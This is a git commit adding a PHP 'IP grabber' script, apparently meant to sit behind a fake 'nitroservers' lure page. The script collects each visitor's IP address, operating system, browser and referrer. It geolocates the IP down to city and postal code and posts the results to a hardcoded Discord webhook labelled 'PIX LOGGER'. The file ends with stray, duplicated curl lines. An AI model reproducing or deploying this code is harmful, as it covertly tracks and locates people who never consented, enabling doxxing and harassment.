b7450c0664bc0083220a80d0a2f2df41247b21ac
Pixxth <61689690+Pixxth@users.noreply.github.com>
2020-06-19 21:06:47 -0400

    Add files via upload

---
+++ EZ_GRABBER.php
@@ -0,0 +1,143 @@
+<?php
+$timezonehere = "America/New_York";
+$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$browser = $_SERVER['HTTP_USER_AGENT'];
+$TheirDate = date('d/m/Y');
+$TheirTime = date('G:i:s');
+$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+$flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
+function getOS() { 
+    global $user_agent;
+    $os_platform    =   "Unknown OS Platform";
+    $os_array       =   array(
+                            '/windows nt 10/i'     =>  'Windows 10',
+                            '/windows nt 6.3/i'     =>  'Windows 8.1',
+                            '/windows nt 6.2/i'     =>  'Windows 8',
+                            '/windows nt 6.1/i'     =>  'Windows 7',
+                            '/windows nt 6.0/i'     =>  'Windows Vista',
+                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+                            '/windows nt 5.1/i'     =>  'Windows XP',
+                            '/windows xp/i'         =>  'Windows XP',
+                            '/windows nt 5.0/i'     =>  'Windows 2000',
+                            '/windows me/i'         =>  'Windows ME',
+                            '/win98/i'              =>  'Windows 98',
+                            '/win95/i'              =>  'Windows 95',
+                            '/win16/i'              =>  'Windows 3.11',
+                            '/macintosh|mac os x/i' =>  'Mac OS X',
+                            '/mac_powerpc/i'        =>  'Mac OS 9',
+                            '/linux/i'              =>  'Linux',
+							'/kalilinux/i'          =>  'KaliLinux',
+                            '/ubuntu/i'             =>  'Ubuntu',
+                            '/iphone/i'             =>  'iPhone',
+                            '/ipod/i'               =>  'iPod',
+                            '/ipad/i'               =>  'iPad',
+                            '/android/i'            =>  'Android',
+                            '/blackberry/i'         =>  'BlackBerry',
+                            '/webos/i'              =>  'Mobile',
+							'/Windows Phone/i'      =>  'Windows Phone'
+                        );
+    foreach ($os_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $os_platform    =   $value;
+        }
+    }   
+    return $os_platform;
+}
+function getBrowser() {
+    global $user_agent;
+    $browser        =   "Unknown Browser";
+    $browser_array  =   array(
+                            '/msie/i'       =>  'Internet Explorer',
+                            '/firefox/i'    =>  'Firefox',
+							'/Mozilla/i'	=>	'Mozila',
+							'/Mozilla/5.0/i'=>	'Mozila',
+                            '/safari/i'     =>  'Safari',
+                            '/chrome/i'     =>  'Chrome',
+                            '/edge/i'       =>  'Edge',
+                            '/opera/i'      =>  'Opera',
+							'/OPR/i'        =>  'Opera',
+                            '/netscape/i'   =>  'Netscape',
+                            '/maxthon/i'    =>  'Maxthon',
+                            '/konqueror/i'  =>  'Konqueror',
+							'/Bot/i'		=>	'BOT Browser',
+							'/Valve Steam GameOverlay/i'  =>  'Steam',
+                            '/mobile/i'     =>  'Handheld Browser'
+                        );
+    foreach ($browser_array as $regex => $value) { 
+        if (preg_match($regex, $user_agent)) {
+            $browser    =   $value;
+        }
+    }
+    return $browser;
+}
+$user_os        =   getOS();
+$user_browser   =   getBrowser();
+
+$ip = $_SERVER['REMOTE_ADDR'];
+$site_refer = $_SERVER['HTTP_REFERER'];
+	if($site_refer == ""){
+		$site = "dirrect connection";
+	}
+else{
+		$site = $site_refer;
+	}
+date_default_timezone_set('$timezonehere');
+$time = date('Y-m-d H:i:s');
+
+
+
+$url = "https://discordapp.com/api/webhooks/723343316753842197/WIa9mPUeWodD8EYSLmQ96Y36tQw0tIDpEDoBWs3SKDMbWkLuI9Elwh4C6IAsr0bxWvn_";
+
+$hookObject = json_encode([
+
+    "content" => "@here an ip has been grabbed",
+    "username" => "PIX LOGGER",
+    "tts" => true,
+    "embeds" => [
+        [
+            "title" => "Ip Grabber",
+            "type" => "rich",
+            "description" => "\n**IP**: `$ip`\n**Device**: `$user_os`\n**Browser**: `$user_browser`\n**Time**: `$time`\n**Region**: `$details->region`\n**Country**: `$details->country`\n**Location**: `$details->city`\n**Postal Code:** `$details->zip`",
+            "url" => "https://nitroservers.000webhostapp.com/nitroservers.php",
+            "timestamp" => "$time",
+            "color" => hexdec( "FFFFFF" ),
+            "footer" => [
+                "text" => "Pix Grabber",
+                "icon_url" => "https://cdn.discordapp.com/attachments/723343161094701089/723353226157490297/icon.png"
+            ],
+            "thumbnail" => [
+                "url" => "https://cdn.discordapp.com/avatars/694110021835030528/a_c60466fb4af24b3a29c1d7e8cab06f0a.gif?size=1024"
+            ],
+            "author" => [
+                "name" => "IP LOGGER",
+                "url" => "https://nitroservers.000webhostapp.com/nitroservers.php"
+            ]
+            ]
+    ]
+
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+
+$ch = curl_init();
+
+curl_setopt_array( $ch, [
+    CURLOPT_URL => $url,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => $hookObject,
+    CURLOPT_HTTPHEADER => [
+        "Content-Type: application/json"
+    ]
+]);
+
+$response = curl_exec( $ch );
+curl_close( $ch );
+
+?>
+curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+curl_setopt( $exec, CURLOPT_POST, 1);
+curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
+curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt( $exec, CURLOPT_HEADER, 0);
+curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
+$response = curl_exec( $exec );
+?>
